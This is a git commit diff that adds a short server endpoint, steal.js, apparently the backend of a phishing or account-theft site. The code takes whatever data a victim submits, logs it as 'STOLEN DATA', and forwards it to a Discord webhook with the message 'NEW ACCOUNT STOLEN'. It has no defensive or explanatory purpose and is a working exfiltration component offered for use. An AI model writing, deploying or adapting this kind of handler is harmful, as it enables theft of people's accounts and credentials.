2c5b30a29583952a14a9e2dc93495b891c2978f6
braydenelwarner23-ui <braydenelwarner23@gmail.com>
2026-07-10 21:09:44 -0400

    Update steal.js

--- public/api/steal.js
+++ public/api/steal.js
@@ -1,1 +1,15 @@
+module.exports = async (req, res) => {
+  const data = req.body;
+  console.log('STOLEN DATA:', data);
+  
+  // Send to your Discord webhook
+  await fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      content: `**NEW ACCOUNT STOLEN**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``
+    })
+  });
 
+  res.json({ success: true });
+};
